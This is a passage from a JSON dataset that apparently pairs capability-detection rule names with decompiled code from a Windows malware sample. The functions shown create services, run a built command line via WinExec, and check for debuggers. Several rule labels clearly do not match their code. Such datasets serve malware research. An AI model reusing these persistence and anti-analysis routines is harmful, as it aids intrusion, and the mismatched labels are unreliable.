= ppiStack52 & 0xffff | uVar5;\n        if (cVar15 != cVar14) {\n            out(0xc4, uVar16);\n            ppiStack52 = uVar5 | uVar11;\n            uStack60 = uVar7 & 0xffffff00 | uVar16 >> 0x20 ^ extraout_CL_00;\n            uStack56 = uStack56 & 0xffff0000 | in_SS;\n            *unaff_EDI = uVar16;\n        }\n    }\n    puStack64 = 0x8;\n    fcn.00401680(0x4220d4, 9, 0x422500);\n    bVar13 = true;\n    fcn.00401680();\n    if ((bVar13) || (!bVar13)) {\n        ppiStack52 = 0x422510;\n        uStack56 = 9;\n    }\n    puVar2 = extraout_EDX_00 + 6;\n    uVar7 = *puVar2;\n    *puVar2 = *puVar2 - 0x68;\n    *0x96a0042 = *0x96a0042 + extraout_AH + (uVar7 < 0x68);\n    uStack60 = 0x4220d4;\n    puStack64 = 0x40344e;\n    fcn.00401680();\n    fcn.00401680();\n    ppiStack52 = 0x422520;\n    uStack56 = 9;\n    uStack60 = 0x4220d4;\n    puStack64 = 0x4034a3;\n    fcn.00401680();\n    uVar12 = (unaff_EBX + 1 & 0xff00 | cVar8 - 0x12) == extraout_DX;\n    fcn.00401680();\n    ppiStack52 = 0x422530;\n    uStack56 = 9;\n    uStack60 = 0x4220d4;\n    puStack64 = 0x4034f4;\n    fcn.00401680();\n    if ((!uVar12) && (uVar12)) {\n        puVar9 = &stack0xffffffc0;\n        cVar8 = '\\x10';\n        puVar4 = puVar10;\n        do {\n            puVar4 = puVar4 + -1;\n            puVar9 = puVar9 + -1;\n            *puVar9 = *puVar4;\n            cVar8 = cVar8 + -1;\n            puStack64 = puVar10;\n        } while ('\\0' < cVar8);\n    }\n    fcn.00401680(0x4220d4, 9, 0x422558, 8);\n    return;\n}\n",
        "token_count": 1555
    },
    "00404da0": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681",
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404e37) overlaps instruction at (ram,0x00404e35)\n// \n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Could not reconcile some variable overlaps\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00404da0(int32_t arg_8h, uint *arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    int32_t *piVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    char cVar5;\n    int32_t iVar4;\n    uint32_t uVar6;\n    char *pcVar7;\n    uint16_t uVar8;\n    uint32_t unaff_EBX;\n    uint *puVar9;\n    uint8_t uVar10;\n    bool bVar11;\n    uint8_t in_AF;\n    uint var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    uint var_2h;\n    \n    var_8h = 0;\n    if (0 < arg_14h) {\n        var_ch = 1;\n        uVar6 = arg_14h * 2;\n        do {\n            uVar2 = *(var_8h + arg_10h);\n            uVar8 = unaff_EBX & 0xff00 | unaff_EBX - 0x12;\n            uVar10 = uVar8 < arg_10h;\n            bVar11 = (POPCOUNT(uVar8 - arg_10h & 0xff) & 1U) != 0;\n            uVar3 = *(var_ch % arg_ch + arg_8h);\n            pcVar7 = var_ch % arg_ch & 0xffffff00U | uVar3;\n            iVar4 = arg_8h;\n            puVar9 = arg_ch;\n            if ((bVar11) && (!bVar11)) {\n                out(*arg_ch, pcVar7);\n                uVar10 = in_AF;\n                do {\n                    cVar5 = iVar4 >> 8;\n                    uVar10 = 9 < (iVar4 & 0xf) | uVar10;\n                    iVar4 = CONCAT31(CONCAT21(iVar4 >> 0x10, cVar5 - uVar10), -uVar10);\n                    puVar9 = arg_ch + 1;\n                    in_AF = uVar10;\n                    unaff_EBX = var_8h;\n                } while (uVar10 || cVar5 == *pcVar7);\n            }\n            piVar1 = var_ch + pcVar7 * 2;\n            *piVar1 = (*piVar1 + 0x7b) - uVar10;\n            *((uVar6 & 0xffffff00 | uVar2) + 0x53) = iVar4;\n            var_10h._0_1_ = arg_14h * 2;\n            *(arg_18h + -1 + var_ch) = var_10h ^ uVar2 ^ *((var_ch + -1) % puVar9 + arg_8h);\n            var_10h._0_1_ = var_10h ^ uVar3;\n            unaff_EBX = unaff_EBX & 0xff00 | var_10h;\n            *(var_ch + arg_18h) = var_10h;\n            uVar6 = var_8h + 1;\n            var_ch = var_ch + 2;\n            var_8h = uVar6;\n        } while (uVar6 < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 810
    },
    "00401ce0": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401dad) overlaps instruction at (ram,0x00401dac)\n// \n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x00401dad)\n\nbool fcn.00401ce0(void)\n\n{\n    uchar *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uchar pvData;\n    uint var_10bh;\n    uint pdwType;\n    uint pcbData;\n    \n    pvData = 0;\n    pcbData = 0x104;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHGetValueA)(0x80000002, 0x422530, 0x422558, &pdwType, &pvData, &pcbData);\n    if (iVar2 != 0) {\n        return false;\n    }\n    puVar1 = (*_sym.imp.MSVCRT.dll_strchr)(&pvData, 0x2e);\n    if (puVar1 == NULL) {\n        return false;\n    }\n    if ((-1 < puVar1) && (-1 >= puVar1)) {\n        out(0xc4, puVar1);\n        *(puVar3 + 3) = puVar1;\n    }\n    // WARNING: Bad instruction - Truncating control flow here\n    *puVar1 = 0;\n    iVar2 = (*_sym.imp.MSVCRT.dll_atoi)(&pvData);\n    if (iVar2 != 6) {\n        return iVar2 == 7;\n    }\n    return true;\n}\n",
        "token_count": 430
    },
    "004035e0": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004035e0(uint32_t arg_8h, uint16_t *arg_ch, int32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = arg_8h;\n    if (arg_10h != 0) {\n        arg_8h = arg_10h;\n        do {\n            uVar1 = uVar1 + *arg_ch;\n            if (uVar1 >> 0x10 != 0) {\n                uVar1 = (uVar1 >> 0x10) + (uVar1 & 0xffff);\n            }\n            arg_ch = arg_ch + 1;\n            arg_8h = arg_8h + -1;\n        } while (arg_8h != 0);\n    }\n    return (uVar1 >> 0x10) + uVar1;\n}\n",
        "token_count": 194
    },
    "00403d30": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403d8e) overlaps instruction at (ram,0x00403d89)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00403d30(uint32_t arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint32_t uVar1;\n    int16_t iVar2;\n    uint16_t uVar3;\n    int32_t iVar4;\n    uchar *puVar5;\n    int32_t unaff_EDI;\n    bool bVar6;\n    float10 extraout_ST0;\n    uint var_4h;\n    \n    puVar5 = &stack0xfffffffc;\n    iVar2 = fcn.004035e0(0, arg_8h, arg_ch + 1U >> 1);\n    bVar6 = (POPCOUNT(iVar2 + 1U & 0xff) & 1U) == 0;\n    iVar4 = (*_sym.imp.dbghelp.dll_ImageNtHeader)();\n    if (!bVar6) {\n        if (bVar6) {\n            puVar5 = *0x8b17b43a;\n            goto code_r0x00403d91;\n        }\n    }\n    arg_8h = *(iVar4 + 0x58);\ncode_r0x00403d91:\n    uVar1 = *(puVar5 + -4);\n    if (uVar1 < arg_8h) {\n        bVar6 = false;\n        iVar4 = (uVar1 - arg_8h & 0xffff) - 1;\n        *(puVar5 + -4) = iVar4;\n    }\n    else {\n        bVar6 = uVar1 < (arg_8h & 0xffff);\n        iVar4 = uVar1 - (arg_8h & 0xffff);\n    }\n    if (!bVar6) {\n        if (bVar6) {\n            out(0xbd, arg_8h);\n            return;\n        }\n    }\n    uVar3 = arg_8h >> 0x10;\n    bVar6 = -1 < iVar4 - uVar3;\n    if (iVar4 < uVar3) {\n        if (bVar6) {\n            if (!bVar6) {\n                *(unaff_EDI + 0x1c) = extraout_ST0;\n            }\n        }\n        iVar4 = (iVar4 - (arg_8h >> 0x10) & 0xffff) - 1;\n        *(puVar5 + -4) = iVar4;\n    }\n    else {\n        iVar4 = iVar4 - (arg_8h >> 0x10);\n    }\n    **(puVar5 + 0x14) = iVar4 + *(puVar5 + 0xc);\n    **(puVar5 + 0x10) = *(*(puVar5 + 8) + 0x58);\n    return;\n}\n",
        "token_count": 658
    },
    "00403770": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403770(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.00403800(&var_68h, &var_4h);\n    fcn.00404c30(&var_68h, var_4h, 0x4110d4, 0x11000);\n    *arg_8h = 0x4110d4;\n    *arg_ch = 0x11000;\n    return;\n}\n",
        "token_count": 242
    },
    "00404070": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint fcn.00404070(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char **ppcVar6;\n    uint *puVar7;\n    char *pcVar8;\n    char *pcVar9;\n    char *pcVar10;\n    uint *puVar11;\n    uint uStack2112;\n    uint uStack2088;\n    char cStack2084;\n    uint uStack2083;\n    ushort uStack2079;\n    uchar uStack2077;\n    uchar uStack2064;\n    uint uStack2063;\n    uchar auStack1824 [12];\n    uchar auStack1812 [8];\n    uchar uStack1804;\n    uint uStack1803;\n    uchar auStack1564 [260];\n    char acStack1304 [20];\n    uchar auStack1284 [239];\n    char acStack1045 [21];\n    uchar uStack1024;\n    uint uStack1023;\n    \n    if (*0x422580 == 0) {\n        return 0;\n    }\n    uStack2088 = 0;\n    cStack2084 = '\\0';\n    uStack2083 = 0;\n    uStack2079 = 0;\n    uStack2077 = 0;\n    uStack2064 = 0;\n    puVar7 = &uStack2063;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1804 = 0;\n    puVar7 = &uStack1803;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1024 = 0;\n    puVar7 = &uStack1023;\n    for (iVar2 = 0xff; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    uStack2112 = 0x104;\n    *(puVar7 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(auStack1284);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, auStack1812, 0x104);\n    fcn.004027d0(&uStack2112, 6);\n    (*_sym.imp.MSVCRT.dll_sprintf)(auStack1564, 0x4223b4, acStack1304, &uStack2112);\n    uStack2088 = 0x42243c;\n    ppcVar6 = &stack0xfffff7d0;\n    iVar2 = 3;\n    do {\n        uVar3 = 0xffffffff;\n        pcVar9 = &cStack2084;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar9 + 1;\n        } while (cVar1 != '\\0');\n        pcVar9 = *ppcVar6;\n        ppcVar6 = ppcVar6 + 1;\n        *(&uStack2088 + ~uVar3 + 3) = 10;\n        uVar3 = 0xffffffff;\n        do {\n            pcVar8 = pcVar9;\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            pcVar8 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar8;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar3;\n        iVar4 = -1;\n        pcVar9 = &cStack2084;\n        do {\n            pcVar10 = pcVar9;\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            pcVar10 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar10;\n        } while (cVar1 != '\\0');\n        puVar7 = pcVar8 + -uVar3;\n        puVar11 = pcVar10 + -1;\n        for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        iVar2 = iVar2 + -1;\n        for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n    } while (iVar2 != 0);\n    (*_sym.imp.MSVCRT.dll_sprintf)(acStack1045 + 1, &cStack2084, auStack1824, auStack1824, acStack1304[0]);\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    acStack1045[~uVar3] = '\\n';\n    uVar3 = 0xffffffff;\n    pcVar9 = 0x422454;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar9 = acStack1045 + 1;\n    do {\n        pcVar10 = pcVar9;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar10 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar10;\n    } while (cVar1 != '\\0');\n    puVar7 = pcVar8 + -uVar3;\n    puVar11 = pcVar10 + -1;\n    for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    iVar2 = fcn.00401720(auStack1564, 0x4223b0, acStack1045 + 1, ~uVar3 - 1);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)(auStack1564, 0);\n    return 1;\n}\n",
        "token_count": 1867
    },
    "00404280": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00404280(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint arg_ch_00;\n    uint arg_ch_01;\n    uint arg_ch_02;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_314h;\n    uint var_210h;\n    uchar lpBuffer;\n    uint var_10bh;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    lpBuffer = 0;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    fcn.00401550();\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(*0x10 + -0x110, 4);\n    var_4h = 0;\n    do {\n        arg_ch_00 = fcn.00401490();\n        arg_ch_01 = fcn.00401490();\n        arg_ch_02 = fcn.00401490();\n        fcn.004027d0(arg_10h, arg_ch_00);\n        fcn.004027d0(arg_8h, arg_ch_01);\n        fcn.004027d0(arg_ch, arg_ch_02);\n        pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n        (*_sym.imp.MSVCRT.dll_sprintf)(&var_314h, 0x4220f4, &lpBuffer, arg_10h);\n        iVar2 = fcn.00404bd0(&var_314h);\n        if (iVar2 != 0) {\n            (*pcVar1)(&var_210h, 0x422100, &lpBuffer, arg_8h);\n            iVar2 = fcn.00404bd0(&var_210h);\n            if (iVar2 != 0) {\n                (*pcVar1)(&var_210h, 0x422100, &lpBuffer, arg_ch);\n                iVar2 = fcn.00404bd0(&var_210h);\n                if (iVar2 != 0) {\n                    iVar2 = 1;\n                    break;\n                }\n            }\n        }\n        var_4h = var_4h + 1;\n        iVar2 = var_8h;\n    } while (var_4h < 3);\n    fcn.004027d0(arg_14h, 4);\n    return iVar2 != 0;\n}\n",
        "token_count": 617
    },
    "00404cc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.00404cc0(uint param_1)\n\n{\n    uint uStack48;\n    uint uStack44;\n    code *pcStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack48 = 0x30;\n    uStack44 = 3;\n    pcStack40 = fcn.00403f20;\n    uStack36 = 0;\n    uStack32 = 0;\n    uStack28 = param_1;\n    uStack24 = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uStack8 = 0x407010;\n    uStack4 = 0;\n    (*_sym.imp.USER32.dll_RegisterClassExA)(&uStack48);\n    return;\n}\n",
        "token_count": 218
    },
    "00404ef0": {
        "rules": [
            "calculate modulo 256 via x86 assembly",
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404feb) overlaps instruction at (ram,0x00404fea)\n// \n// WARNING: Removing unreachable block (ram,0x00404fbf)\n// WARNING: Restarted to delay deadcode elimination for space: ram\n\nuint fcn.00404ef0(void)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    char **ppcVar3;\n    ushort uVar4;\n    int32_t iVar5;\n    char *pcVar6;\n    uint uVar7;\n    int32_t extraout_ECX;\n    uint16_t uVar8;\n    int32_t unaff_EBX;\n    uchar *puVar9;\n    uint *puVar10;\n    uint *puVar11;\n    uint8_t *puVar12;\n    char **ppcVar13;\n    bool bVar14;\n    bool bVar15;\n    unkbyte6 Var16;\n    uint *puStack24336;\n    uint *puStack24332;\n    uint uStack24251;\n    uchar auStack24215 [24091];\n    uchar *puStack124;\n    uchar *puStack56;\n    uint auStack40 [8];\n    uint uStack8;\n    \n    puVar10 = &stack0xfffffffc;\n    puVar9 = &stack0xfffffffc;\n    if ((*0x10 != 0x28) && (puVar9 = &stack0xfffffffc,  *0x10 == 0x28)) {\n        puStack124 = 0xfffffff0;\n        puVar11 = 0xfffffff0;\n        puVar9 = 0xfffffff0;\n        cVar2 = '\\x10';\n        do {\n            puVar10 = puVar10 + -1;\n            puVar11 = puVar11 + -1;\n            *puVar11 = *puVar10;\n            cVar2 = cVar2 + -1;\n            puStack56 = &stack0xfffffffc;\n        } while ('\\0' < cVar2);\n    }\n    iVar5 = fcn.004015f0(*(puVar9 + 0x18), *(puVar9 + 0x1c), 0x422124, 7);\n    *(puVar9 + -4) = iVar5;\n    if (iVar5 == 0) {\n        return 0;\n    }\n    iVar5 = 7;\n    pcVar6 = NULL;\n    ppcVar13 = puVar9 + -0x23;\ncode_r0x00404f59:\n    ppcVar3 = _sym.imp.MSVCRT.dll_rand;\n    puVar9[-0x24] = 0;\n    for (; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *ppcVar13 = pcVar6;\n        ppcVar13 = ppcVar13 + 1;\n    }\n    *ppcVar13 = pcVar6;\n    *(ppcVar13 + 2) = pcVar6;\n    bVar14 = false;\n    bVar15 = true;\n    puVar10 = NULL;\n    do {\n        if ((bVar14) || (!bVar14)) {\n            Var16 = (*ppcVar3)();\n            iVar5 = extraout_ECX;\n        }\n        else {\n            iVar5 = iVar5 + -1;\n            ppcVar13 = ppcVar3;\n            if (iVar5 != 0 && bVar15) goto code_r0x00404f59;\n            uVar7 = *puVar10;\n            *ppcVar3 = puVar10 + 1;\n            puVar10 = 0xffb8ec44;\n            Var16 = CONCAT24(uVar7 >> 0x1f, *0x9750e2b5 & 0xffffff00 | *(unaff_EBX + (*0x9750e2b5 & 0xff)));\n        }\n        uVar8 = Var16 >> 0x20;\n        pcVar6 = Var16 & 0x800000ff;\n        if (pcVar6 < 0) {\n            pcVar6 = (pcVar6 + -1 | 0xffffff00) + 1;\n        }\n        (puVar9 + -0x24)[puVar10] = pcVar6;\n        puVar11 = puVar10 + 1;\n        bVar14 = puVar11 < 0x20;\n        iVar1 = puVar10 + -0x1f;\n        bVar15 = puVar11 == 0x20;\n        puVar10 = puVar11;\n    } while (bVar14);\n    if ((0x1f < puVar11) && (SBORROW4(puVar11, 0x20) != iVar1 < 0)) {\n        out(0xc4, pcVar6);\n        uVar8 = uVar8 & 0xff00 | Var16 >> 0x20 ^ iVar5;\n        *ppcVar3 = pcVar6;\n        bVar15 = unaff_EBX >> 8 == *pcVar6;\n    }\n    puVar10 = *(puVar9 + -4);\n    puStack24332 = puVar9 + -0x24;\n    puVar11 = puVar10;\n    for (iVar5 = 8; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar11 = *puStack24332;\n        puStack24332 = puStack24332 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    if ((bVar15) || (!bVar15)) {\n        iVar5 = *(puVar9 + 0x10);\n    }\n    else {\n        puStack24336 = puVar11 + 1;\n        uVar7 = in(uVar8);\n        *puVar11 = uVar7;\n        if (&stack0xffffa169 < 1) {\n            *(puVar10 + -0xd) = *(puVar10 + -0xd);\n            _pe_dos_header = &stack0xffffa164;\n            pcVar6 = puVar10 + 1;\n            *pcVar6 = *pcVar6 + pcVar6;\n            *(puVar10 + 0x65) = *(puVar10 + 0x65) + uVar8;\n            *(puVar9 + -0x18) = &stack0xffffa0f0;\n            *(puVar9 + -4) = 0;\n            (*_sym.imp.MSVCRT.dll___set_app_type)(2);\n            *0x4225b0 = 0xffffffff;\n            *0x4225b4 = 0xffffffff;\n            puVar10 = (*_sym.imp.MSVCRT.dll___p__fmode)();\n            *puVar10 = *0x4225ac;\n            puVar10 = (*_sym.imp.MSVCRT.dll___p__commode)();\n            *puVar10 = *0x4225a8;\n            *0x4225b8 = *_sym.imp.MSVCRT.dll__adjust_fdiv;\n            fcn.004051cb();\n            if (*0x422560 == 0) {\n                (*_sym.imp.MSVCRT.dll___setusermatherr)(0x4051c8);\n            }\n            fcn.004051b6();\n            sub.MSVCRT.dll__initterm(0x407008, 0x40700c);\n            *(puVar9 + -0x6c) = *0x4225a4;\n            (*_sym.imp.MSVCRT.dll___getmainargs)\n                      (puVar9 + -0x60, puVar9 + -0x70, puVar9 + -100, *0x4225a0, puVar9 + -0x6c);\n            sub.MSVCRT.dll__initterm(0x407000, 0x407004);\n            puVar12 = *_sym.imp.MSVCRT.dll__acmdln;\n            *(puVar9 + -0x74) = puVar12;\n            if (*puVar12 != 0x22) {\n                do {\n                    if (*puVar12 < 0x21) goto code_r0x0040513f;\n                    puVar12 = puVar12 + 1;\n                    *(puVar9 + -0x74) = puVar12;\n                } while( true );\n            }\n            do {\n                puVar12 = puVar12 + 1;\n                *(puVar9 + -0x74) = puVar12;\n                if (*puVar12 == 0) break;\n            } while (*puVar12 != 0x22);\n            if (*puVar12 != 0x22) goto code_r0x0040513f;\n            do {\n                puVar12 = puVar12 + 1;\n                *(puVar9 + -0x74) = puVar12;\ncode_r0x0040513f:\n            } while ((*puVar12 != 0) && (*puVar12 < 0x21));\n            *(puVar9 + -0x30) = 0;\n            (*_sym.imp.KERNEL32.dll_GetStartupInfoA)(puVar9 + -0x5c);\n            if ((puVar9[-0x30] & 1) == 0) {\n                uVar4 = 10;\n            }\n            else {\n                uVar4 = *(puVar9 + -0x2c);\n            }\n            uVar7 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(0, 0, puVar12, uVar4);\n            uVar7 = main(uVar7);\n            *(puVar9 + -0x68) = uVar7;\n            (*_sym.imp.MSVCRT.dll_exit)(uVar7);\n            uVar7 = ***(puVar9 + -0x14);\n            *(puVar9 + -0x78) = uVar7;\n            uVar7 = sub.MSVCRT.dll__XcptFilter(uVar7, *(puVar9 + -0x14));\n            return uVar7;\n        }\n    }\n    *(unaff_EBX + -0x74afefb3) = *(unaff_EBX + -0x74afefb3) ^ iVar5;\n    uStack24251 = 0x405007;\n    fcn.00401050();\n    fcn.00403fc0(*(puVar9 + 0x19), *(puVar9 + 0x1d));\n    return 1;\n}\n",
        "token_count": 2288
    },
    "004013d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401425) overlaps instruction at (ram,0x00401423)\n// \n\nuint __cdecl fcn.004013d0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    char unaff_BL;\n    int32_t unaff_EDI;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_CreateServiceA)();\n    if (iVar1 == 0) {\n        return 0;\n    }\n    if (-1 < iVar1) {\n        if (-1 >= iVar1) goto code_r0x00401422;\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n    unaff_EDI = 0x40142c;\ncode_r0x00401422:\n    *(unaff_EDI + 0x5e) = *(unaff_EDI + 0x5e) + unaff_BL;\n    return 1;\n}\n",
        "token_count": 216
    },
    "00401490": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004014a9) overlaps instruction at (ram,0x004014a5)\n// \n\nint32_t __fastcall fcn.00401490(int32_t param_1)\n\n{\n    int32_t in_EAX;\n    code *pcVar1;\n    int32_t unaff_ESI;\n    int32_t *unaff_EDI;\n    bool in_CF;\n    char in_ZF;\n    \n    if ((in_CF) || (!in_CF)) {\n        pcVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    }\n    else {\n        if (param_1 != 1 && in_ZF != '\\0') {\n            return in_EAX;\n        }\n        *unaff_EDI = unaff_ESI + 4;\n        pcVar1 = sym.imp.MSVCRT.dll_rand + in_CF + *0x9750e2b5;\n    }\n    return pcVar1 % 5 + 3;\n}\n",
        "token_count": 212
    },
    "004014c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004014dd) overlaps instruction at (ram,0x004014da)\n// \n\nuint __cdecl fcn.004014c0(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_8h_00;\n    uint uVar1;\n    char *in_EDX;\n    char *unaff_EDI;\n    \n    *unaff_EDI = *unaff_EDI + '!';\n    *in_EDX = *in_EDX + ']';\n    arg_8h_00 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0);\n    fcn.004043e0(arg_8h_00, arg_8h);\n    uVar1 = fcn.004013d0(arg_8h_00, arg_8h, arg_ch);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(arg_8h_00);\n    return uVar1;\n}\n",
        "token_count": 208
    },
    "00401550": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040156d) overlaps instruction at (ram,0x0040156b)\n// \n\nuchar * __fastcall fcn.00401550(uint param_1, uchar *param_2)\n\n{\n    uint uVar1;\n    uchar *puVar2;\n    \n    puVar2 = *0x422568;\n    if (*0x422568 == NULL) {\n        if ((*0x422568 < 0) || (*0x422568 >= 0)) {\n            uVar1 = (*_sym.imp.MSVCRT.dll_time)(0);\n            puVar2 = (*_sym.imp.MSVCRT.dll_srand)(uVar1);\n        }\n        else {\n            *param_2 = *param_2;\n            puVar2 = param_2 + 0x4060f9;\n        }\n        *0x422568 = 0x1;\n    }\n    return puVar2;\n}\n",
        "token_count": 206
    },
    "004015f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
